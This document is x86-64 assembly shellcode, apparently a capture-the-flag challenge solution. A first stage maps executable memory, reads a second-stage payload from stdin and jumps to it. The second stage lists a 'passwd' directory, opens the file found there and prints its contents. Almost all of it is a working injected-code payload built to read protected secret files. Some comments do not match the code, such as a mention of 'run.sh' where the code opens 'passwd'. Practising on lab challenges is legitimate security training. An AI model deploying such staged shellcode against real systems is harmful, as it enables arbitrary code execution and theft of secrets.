BITS 64

    ; mmap
    ; rax: 9
    ; rdi: 0
    ; rsi: size
    ; rdx: 7
    ; r10: 34
    ; r8: ignored
    ; r9: 0

    ; rax
    xor rax, rax
    mov al, 9

    ; rdi
    xor rdi, rdi

    ; rsi
    xor rsi, rsi
    mov si, 0xf000

    ; rdx, already 0
    mov dx, 7

    ; r10, already 0
    mov r10b, 34

    ; r9
    xor r9, r9

    syscall

    ; read
    ; rax: 0
    ; rdi: 0
    ; rsi: *buffer
    ; rdx: size, 0x70
    ; rax -> pointer to mmaped memory

    ; rax points to the buffer
    xchg rax, rdx
    xchg rdx, rsi

    ; rax
    xor rax, rax

    ; rdi already 0

    syscall

    ; jump to the new shellcode
    jmp rsi

    ; the first call to read will read
    ; 50 bytes, so we need to fill this
    ; shellcode up until 50 and then
    ; we can start writting the new
    ; shellcode that will be executed
    ; in the new mmap memory
    ;
    ; current shellcode size: 38,
    ; fill shellcode with 12 nop

    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop

    ; new shellcode
    ; open '/challenge/programmation/ch10/run.sh'

    ; open
    ; rax: 2
    ; rdi: /challenge/programmation/ch10/run.sh
    ; rsi: 1 (write mode)
    ; rdx: 0

    ; rax
    xor rax, rax
    cqo
    mov al, 2
    
    mov rbx, 0x00647773736170
    push rbx
    
    ; rdi
    push rsp
    pop rdi

    ; rsi
    xor rsi, rsi
    ;inc sil

    ; rdx

    syscall

   ; getdents
    ; rax: 78
    ; rdi: fd
    ; rsi: buffer
    ; size_buffer

    ; rax, rdi
    xchg rax, rdi
    xor rax, rax
    mov al, 78

    ; rsi
    sub rsp, 0x120
    push rsp
    pop rsi

    mov dx, 0x120

    syscall

    ; open filen
    ; rax: 2
    ; rdi: passwd//filename
    ; rsi: 1
    ; rdx: 0

    ; rax
    mov al, 2

    ; rdi
    xchg rdi, rsi
    add rdi, 32
    mov rsp, rdi
    add rsp, 8
    mov WORD [rsp], 0x2f2f
    mov rbx, 0x2f2f647773736170
    push rbx
    sub rsp, 40

    ;rsi read mode
    xor rsi, rsi

    ; rdx
    xor rdx, rdx

    syscall

    ; debugging purpose, if this fail to
    ; open the file, it would end with a
    ; segmentation fault

    cmp rax, 4
    jne die
 
    ; read file
    ; rax: 0
    ; rdi: fd
    ; rsi: buffer
    ; rdx: size

    ; rax, rdi
    xchg rax, rdi
    xor rax, rax

    ; rsi
    sub rsp, 0x20
    push rsp
    pop rsi

    ; rdx
    mov dl, 0x20

    syscall

    ; write to stdout
    ; rax: 1
    ; rdi: 1
    ; rsi: buffer
    ; rdx: size

    ; rax, rdx
    xchg rax, rdx

    ; rdi
    mov dil, 1

    mov al, 1

    syscall

    ; if we can open the file exit cleanly
    mov al, 60
    xor rdi, rdi
    syscall

die:
    nop
